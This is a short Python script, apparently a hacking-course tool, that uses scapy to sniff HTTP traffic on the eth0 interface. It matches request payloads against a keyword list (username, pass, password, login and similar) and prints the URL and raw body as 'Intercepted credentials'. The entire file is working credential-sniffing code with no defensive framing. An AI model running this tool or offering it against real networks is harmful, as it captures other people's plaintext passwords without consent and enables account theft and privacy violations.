import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=packSniff)

def getURL(pkt):
    return pkt[http.HTTPRequest].Host + pkt[http.HTTPRequest].Path

def outputCreds(pkt):
    print("Possible credentials at: ", end="")
    print(getURL(pkt))
    print("Intercepted credentials: ", end="")
    print(pkt[scapy.Raw])
    print('\n')

def getLoginInfoPkt(pkt):
    keywords=["username", "uname", "un", "user", "email", "pwd", "pass", "pw", "password", "pswd", "login", "cred"]
    if pkt.haslayer(http.HTTPRequest):
        if pkt.haslayer(scapy.Raw):
            # print(pkt[scapy.Raw])
            for word in keywords:
                if word in str(pkt[scapy.Raw]):
                    return pkt

def packSniff(pkt):
    POI = getLoginInfoPkt(pkt)
    if POI:
        outputCreds(POI)

def main():
    sniff("eth0")

if __name__== "__main__":
    main()